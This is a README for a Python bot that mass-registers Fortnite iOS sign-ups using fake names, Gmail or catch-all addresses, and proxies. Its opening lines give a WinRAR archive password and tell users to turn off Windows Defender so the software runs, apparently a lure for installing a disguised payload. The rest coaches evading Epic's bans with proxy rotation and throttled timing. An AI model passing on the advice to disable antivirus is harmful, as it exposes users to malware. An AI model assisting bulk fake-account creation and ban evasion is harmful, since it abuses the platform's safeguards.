# WinRar Password: kol2233

Some users were not able to start the software because of windows defender, so make sure to turn it off.

Make sure to leave a star if this repository helped you!

# fortniteIOSsignup
Simple python bot using requests to signup for bulk fortnite ios invites


#################
PASSWORD TO THE ACCOUNTS IS THE SAME AS THE USERNAME!
#################

# Basic Setup...

Download either catchallNoProfiles.py or gmailNoProfiles.py (gmail if you are using gmail, catchall if you're using catchall)

Install the dependencies listed in the dependencies file (look below for the commands, google pip if you don't have it.

Edit the file you are going to run either the gmail or cathcall and ONLY edit ether prefix - '' to have your prefix between the '' so if your gmail was test@gmail.com your prefix = 'test' if you are using catchall replace domain.com with your domain.

Don't change anything else until you have the bot working.


###########################################################

YOU RUN THE FILE YOU EDIT - EITHER GMAIL OR CATCHALL

If you use the NoProfiles versions you don't need any other files aslong as you install the dependencies.

###########################################################

# Use common sense, any issues shoot me a discord or twitter message.

Twitter: @SL34K

Discord: Sleak#4391

# Using Profiles.CSV version (NOT NEEDED UNLESS YOU ARE USING THE OLD VERSION)

MAKE SURE TO CHANGES THE PROFILES.CSV so you get a fresh set of usernames so you wont be blocked by EPIC.

Go here:

https://www.fakenamegenerator.com/order.php

Chose your name set.

Make country united kingdom.

Include these: (MAKE SURE THEY'RE IN THIS ORDER!)

GivenName,Surname,Birthday,Street Address,City,State Full name,post code,Username

Wait for the email, download the zip and extract the .csv file and rename it to profiles.csv


###########################################

IF YOU ARE GETTING AN ERROR MAKE SURE THE SIGNUP PAGE HAS NOT CRASHED AGAIN: https://www.epicgames.com/fortnite/en-US/mobile/sign-up

###########################################

You can change the waittimes after signing up, 10 seconds should insure no ban if you aren't using any proxies, less would probably work fine aswell.

CATCHALL FILE = USE WITH A CATCHALL DOMAIN - EDIT the DOMAIN TO YOUR DOMAIN.

GMAIL FILE - Enter your gmail prefix (if your gmail is github@gmail.com your prefix would be github) between the ''.

Install the dependencies with pip in the dependencies file (use google)

# Dependencies 

#RUN DEPENDENCIES.py

OR:


MAC TRY THESE (run in terminal or bash):

sudo pip install requests

sudo pip install bs4

sudo pip install datetime

sudo pip install names

or

sudo pip3 install requests

sudo pip3 install bs4

sudo pip3 install datetime

sudo pip3 install names

Windows (run in CMD):

pip install requests

pip install bs4

pip install datetime

pip install names

# HOW TO USE PROXIES
Make a new folder with a random name, place the gmailProxySupportNoProfiles.py or catchallProxySupportNoProfiles.py and a file called proxy.txt with 1 proxy in it and run it, if you want to run on multiple proxies just make multiple folders all with a different proxy in the proxy.txt this way they will all make one account per 10 seconds to avoid any ban.